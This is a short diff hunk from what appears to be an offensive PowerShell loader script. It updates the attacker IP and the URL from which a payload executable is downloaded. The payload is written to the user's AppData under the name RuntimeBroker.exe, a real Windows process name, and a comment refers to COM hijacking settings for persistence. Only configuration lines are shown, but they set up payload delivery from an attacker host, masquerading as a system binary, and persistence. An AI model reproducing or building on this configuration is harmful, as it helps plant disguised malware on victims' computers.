@@ -76,8 +76,8 @@ param(
 # ==============================================================================
 # CONFIG
 # ==============================================================================
-$ATTACKER_IP  = "192.168.247.139"
-$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_debug.exe"
+$ATTACKER_IP  = "100.103.4.93"
+$PAYLOAD_URL  = "http://${ATTACKER_IP}:9999/loader_v2.exe"
 $PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\WindowsApps\RuntimeBroker.exe"
 
 # COM Hijacking config -- CLSID/ProgID must stay consistent (see header)
